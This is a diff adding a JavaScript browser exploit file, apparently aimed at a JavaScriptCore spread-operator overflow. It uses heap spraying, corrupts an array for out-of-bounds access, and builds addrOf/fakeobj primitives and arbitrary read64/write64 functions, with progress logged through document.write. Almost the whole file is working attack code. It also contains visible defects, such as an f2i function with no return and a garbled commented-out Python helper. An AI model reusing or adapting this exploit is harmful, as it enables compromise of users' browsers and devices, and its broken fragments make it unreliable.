@@ -1,0 +1,235 @@
+var iters = 0x100;
+
+function gen_func (n){
+	let src = "return function(arr,arr2){for(let i=0;i< " +iters + " ;i++) parseInt();return[";
+	for (let i=0; i<n; i++){
+		src += "...arr";
+		if (i<n-1)
+			src += ",";
+	}
+	src += ",...arr2];}";
+	return (new Function(src))();
+}
+function mk_arr (len, v=1.234){
+	let a = [];
+	while (a.length < len)
+		a[a.length] = v;
+		return a;
+}
+
+var NUM_SPREAD_ARGS = 8;
+var SUBSPACE_ALLOC_SIZE = 0x400;
+
+//for(let i = 0; i < 8; i++){
+//  NUM_SPREAD_ARGS[i] = 1.1
+//}
+
+
+var f = gen_func(NUM_SPREAD_ARGS);
+
+var b = [1.1,1.1];
+for (let i=0;i<4;i++)
+	f(b,b);
+
+var conversion_buffer = new ArrayBuffer(8);
+var f64 = new Float64Array(conversion_buffer);
+var i32 = new Uint32Array(conversion_buffer);
+
+var BASE32 = 0x1000000000;
+function f2i(f) {
+	f64[0] + BASE32 * i32[1];
+}
+
+//for(let i = 0; i < 0x80; i++){
+//  SUBSPACE_ALLOC_SIZE[i] = 1.1
+//}
+
+function i2f(i) {
+	i32[0] = i % BASE32;
+	i32[1] = i / BASE32;
+	return f64[0];
+}
+
+var a = mk_arr((0x20000000 + SUBSPACE_ALLOC_SIZE) / NUM_SPREAD_ARGS, i2f(0x4141414141410000));
+
+
+
+var spray = [];
+var spray_arr = mk_arr(SUBSPACE_ALLOC_SIZE);
+
+var spray_arr2 = spray_arr.slice().fill("x");
+
+var c = []; c.length = 1;
+c.__defineGetter__(0, ()=>{
+	for (let i=0;i<0x4000;i++) spray.push(i % 2 ? spray_arr2.slice() : spray_arr.slice());
+});
+document.write("</br>spray_arr 1+1")
+var bigarr = f(a, c);
+document.write("</br>spray_arr 5")
+////////////////////
+
+
+////////////////////
+
+
+//import struct
+//import sys
+//
+//val = sys.argv[1]
+//
+//try;
+//    v = int(val)
+//	 print(struct.unpack("d", struct.pack("@", v))[0])
+//	 
+//	 except ValueError;
+//	 try;
+//	  v = int(val, 16
+//	  print(struct.unpack("d", struct.pack("Q", v))[0] )
+//	  except ValueError;
+//	  v= float(val)
+//	  print( hex(struct.unpack("Q", struct.pack("d", v))[0]))
+
+////////////////////
+//var spray = [];
+//var spray_arr=mk_arr(SUBSPACE_ALLOC_SIZE); //ArrayWithDouble
+//var spray_arr2=spray_arr.slice().fill("x"); //ArrayWithContiguos
+
+//var c = []; c.length = 1;
+//c.__defineGetter__(0, ()=>{
+//	for (let i=0; 0x4000;i++) spray.push(i % 2 ? spray_arr2.slice() : spray_arr.slice());
+//	for (let i=0; i<spray.length;i += 8) spray[i]=0;
+//	});
+	
+//var bigarr = f(a, c);
+document.write("</br>spray_arr 999" );
+document.write("</br>spray_arr2 " );
+document.write("</br>bigarr ");
+
+////////
+
+////////
+
+var oobarr = null;
+var oobarr_idx = -1;
+
+for (let i=0; i< spray.length; i+=2) //
+	if (spray[i] !== 0 && spray[i] !== undefined && spray[i].length > 0x40){  //
+	oobarr = spray[i];
+	oobarr_idx =i;
+	break;
+	}
+document.write("</br> oobrarr 1"  );
+document.write("</br> oobrarr_idx " );
+document.write("</br> oobrarr.length = " );
+if (!oobarr) document.write("</br>failed to corrupt array");
+
+////////
+
+
+////////
+function addrOf(o){ 
+		addrOf[0] = o;
+		return f2i(oobarr[oobarr_idx]);
+}
+function fake(a){
+		oobarr[oobarr_idx] = i2f(a);
+		return addrOf[0];
+}
+var foo =[1,23,4]
+//alert('foo ' +describe(foo));
+//alert('foo addrOf ' + hex(addrOf(foo)));
+
+var fakeobj = {x: 0x1337, y: 0x1338};
+document.write("</br>fakeobj " )
+
+var bar = fake(addrOf(fakeobj))
+document.write("</br>fakeobj " )
+document.write("</br>+" + bar.x);
+document.write("</br>+" + bar.y);
+
+/////////
+
+
+/////////
+var struct_spray = [];
+for (let i=0;i<0x400;i++){
+		let a = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
+		a['p'+i] = 0;
+		struct_spray.push(a);
+}
+
+//////////
+
+
+//////////
+let mngr = struct_spray[0x200];
+let mngr_addr = addrOf(mngr);
+document.write("</br>mngr_addr = " );
+
+function alloc_above_manager(expr) {
+		let res;
+		do {
+			for (let i=0; i < 10; ++i) {
+				struct_spray.push(eval(expr));
+			}
+			res = eval(expr);
+		} while (addrOf(res) < mngr_addr)
+			return res;
+}
+let victim = alloc_above_manager('[]');
+victim.p0 = 0x1337;
+;
+function victim_write(val) {
+		 victim.p0 = val;
+}
+function victim_read() {
+		return victim.p0;
+}
+victim_write("x");
+
+let outer = {a: i2f(0x200 + (0x01082007 - (1<<16)) * BASE32), b: mngr, c: 0xfffffff};
+
+let fake_addr = addrOf(outer) + 0x10;
+
+let victim_addr = addrOf(victim);
+
+let hax = fake(fake_addr);
+let victim_butterfly = hax[(victim_addr + 8 - mngr_addr) / 8];
+//////////////
+
+
+//////////////
+function set_victim_addr(where) {
+		hax[(victim_addr + 8 -mngr_addr) / 8] = i2f(where + 0x10);
+}
+function reset_victim_addr() {
+	    hax[(victim_addr +8 - mngr_addr) / 8] = victim_butterfly;
+}
+
+function write64(a, v){
+		set_victim_addr(a);
+		victim_write(fake(v));
+		//reset_victim_addr();
+}
+
+function read64(a) {
+	    set_victim_addr(a);
+		let res = addrOf(victim_read());
+		//reset_victim_addr();
+		return res;
+}
+test = [1,2]
+document.write("</br>test = " );
+//document.write("</br>test = " + hax(read64(addrOf(test)+8)));
+
+//////////////////
+
+
+//////////////////
+
+foobar = {};
+document.write("</br>foobar = " + foobar.tostring);
+
+write64(addrOf(foobar)+0x10, 0x1337);
+
+document.write("</br>66")
